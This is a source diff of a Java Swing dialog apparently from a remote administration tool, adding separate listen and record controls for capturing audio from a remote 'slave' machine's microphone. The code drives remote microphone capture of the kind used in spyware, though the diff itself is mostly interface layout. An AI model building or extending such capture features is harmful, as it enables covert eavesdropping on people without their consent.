@@ -30,12 +30,14 @@ public class DialogRemoteSoundCapture extends BaseDialog {
 
 	private JPanel contentPane;
 	private Slave slave;
-	private JButton btnStart;
-	private JButton btnStop;
+	private JButton btnStartListen;
+	private JButton btnStopListen;
 	public Packet58ServerDownloadSoundCapture packet;
 
 	public static HashMap<Slave, DialogRemoteSoundCapture> instances = new HashMap<Slave, DialogRemoteSoundCapture>();
 	private JComboBox comboBox;
+	private JButton btnStopRecord;
+	private JButton btnStartRecording;
 
 	public DialogRemoteSoundCapture(Slave sl) {
 		addWindowListener(new WindowAdapter() {
@@ -51,19 +53,43 @@ public class DialogRemoteSoundCapture extends BaseDialog {
 		instances.put(slave, this);
 		setTitle("Sound capture - " + sl.getIP() + " - " + sl.getComputerName());
 		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
-		setBounds(100, 100, 332, 67);
+		setBounds(100, 100, 332, 114);
 		contentPane = new JPanel();
 		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
 		setContentPane(contentPane);
 
-		btnStart = new JButton("Start");
-		btnStart.addActionListener(new ActionListener() {
+		btnStartListen = new JButton("Start Listening");
+		btnStartListen.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
 				slave.addToSendQueue(new Packet84ToggleSoundCapture(true));
-				btnStart.setEnabled(false);
-				btnStop.setEnabled(true);
-				comboBox.setEnabled(false);
-				
+				btnStartListen.setEnabled(false);
+				btnStopListen.setEnabled(true);
+				comboBox.setEnabled(false);				
+			}
+		});
+		btnStartListen.setIcon(IconUtils.getIcon("microphone-plus"));
+
+		btnStopListen = new JButton("Stop");
+		btnStopListen.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent arg0) {
+				btnStartListen.setEnabled(true);
+				btnStopListen.setEnabled(false);
+				comboBox.setEnabled(true);
+				slave.addToSendQueue(new Packet84ToggleSoundCapture(false));
+			}
+		});
+		btnStopListen.setEnabled(false);
+		btnStopListen.setIcon(IconUtils.getIcon("microphone-minus"));
+
+		comboBox = new JComboBox();
+		comboBox.setModel(new DefaultComboBoxModel(new String[] { "16000", "12000", "8000", "4000", "2000" }));
+		
+		btnStartRecording = new JButton("Start Recording");
+		btnStartRecording.setIcon(IconUtils.getIcon("microphone-plus"));
+		btnStartRecording.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent arg0) {
+				btnStartRecording.setEnabled(false);
+				btnStopRecord.setEnabled(true);
 				new Thread(new SoundWriter() {
 					@Override
 					public void onRead(byte[] data, int read) throws Exception {
@@ -72,32 +98,54 @@ public class DialogRemoteSoundCapture extends BaseDialog {
 				}).start();
 			}
 		});
-		btnStart.setIcon(IconUtils.getIcon("microphone-plus"));
-
-		btnStop = new JButton("Stop");
-		btnStop.addActionListener(new ActionListener() {
-			public void actionPerformed(ActionEvent arg0) {
-				slave.addToSendQueue(new Packet84ToggleSoundCapture(false));
-
-				btnStart.setEnabled(true);
-				btnStop.setEnabled(false);
-				comboBox.setEnabled(true);
+		
+		btnStopRecord = new JButton("Stop");
+		btnStopRecord.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent e) {
+				btnStartRecording.setEnabled(true);
+				btnStopRecord.setEnabled(false);
 				SoundWriter.instance.running = false;
 			}
 		});
-		btnStop.setEnabled(false);
-		btnStop.setIcon(IconUtils.getIcon("microphone-minus"));
+		btnStopRecord.setEnabled(false);
+		btnStopRecord.setIcon(IconUtils.getIcon("microphone-minus"));
 
-		comboBox = new JComboBox();
-		comboBox.setModel(new DefaultComboBoxModel(new String[] { "16000", "12000", "8000", "4000", "2000" }));
 		GroupLayout gl_contentPane = new GroupLayout(contentPane);
-		gl_contentPane.setHorizontalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addContainerGap().addComponent(btnStart).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnStop).addPreferredGap(ComponentPlacement.RELATED).addComponent(comboBox, 0, 132, Short.MAX_VALUE).addContainerGap()));
-		gl_contentPane.setVerticalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE).addComponent(btnStart).addComponent(btnStop).addComponent(comboBox, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)).addContainerGap(GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)));
+		gl_contentPane.setHorizontalGroup(
+			gl_contentPane.createParallelGroup(Alignment.LEADING)
+				.addGroup(gl_contentPane.createSequentialGroup()
+					.addContainerGap()
+					.addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING)
+						.addGroup(gl_contentPane.createSequentialGroup()
+							.addComponent(btnStartListen)
+							.addPreferredGap(ComponentPlacement.RELATED)
+							.addComponent(btnStopListen)
+							.addPreferredGap(ComponentPlacement.RELATED)
+							.addComponent(comboBox, 0, 88, Short.MAX_VALUE))
+						.addGroup(gl_contentPane.createSequentialGroup()
+							.addComponent(btnStartRecording, GroupLayout.PREFERRED_SIZE, 121, GroupLayout.PREFERRED_SIZE)
+							.addPreferredGap(ComponentPlacement.RELATED)
+							.addComponent(btnStopRecord, GroupLayout.PREFERRED_SIZE, 75, GroupLayout.PREFERRED_SIZE)))
+					.addContainerGap())
+		);
+		gl_contentPane.setVerticalGroup(
+			gl_contentPane.createParallelGroup(Alignment.LEADING)
+				.addGroup(gl_contentPane.createSequentialGroup()
+					.addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE)
+						.addComponent(btnStartListen)
+						.addComponent(btnStopListen)
+						.addComponent(comboBox, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))
+					.addPreferredGap(ComponentPlacement.RELATED)
+					.addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE)
+						.addComponent(btnStartRecording, GroupLayout.PREFERRED_SIZE, 25, GroupLayout.PREFERRED_SIZE)
+						.addComponent(btnStopRecord, GroupLayout.PREFERRED_SIZE, 25, GroupLayout.PREFERRED_SIZE))
+					.addContainerGap(19, Short.MAX_VALUE))
+		);
 		contentPane.setLayout(gl_contentPane);
 	}
 
 	public boolean isRunning() {
-		return btnStop.isEnabled();
+		return btnStopListen.isEnabled();
 	}
 
 	public int getQuality() {
